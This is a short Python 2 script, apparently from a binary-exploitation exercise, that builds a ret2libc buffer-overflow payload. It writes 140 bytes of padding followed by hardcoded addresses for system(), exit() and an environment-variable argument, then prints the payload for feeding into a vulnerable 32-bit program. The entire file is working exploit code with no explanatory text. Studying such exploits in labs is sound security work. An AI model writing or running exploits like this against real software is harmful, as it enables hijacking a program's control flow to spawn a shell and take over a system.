import struct

system_addr = struct.pack("<I",0xf7e29d10)
exit_addr = struct.pack("<I",0xf7e1cf70)
args_addr = struct.pack("<I",0xffffdef5) #<- the env addr

buf = "A" * 140

buf += system_addr
buf += exit_addr
buf += args_addr

print buf
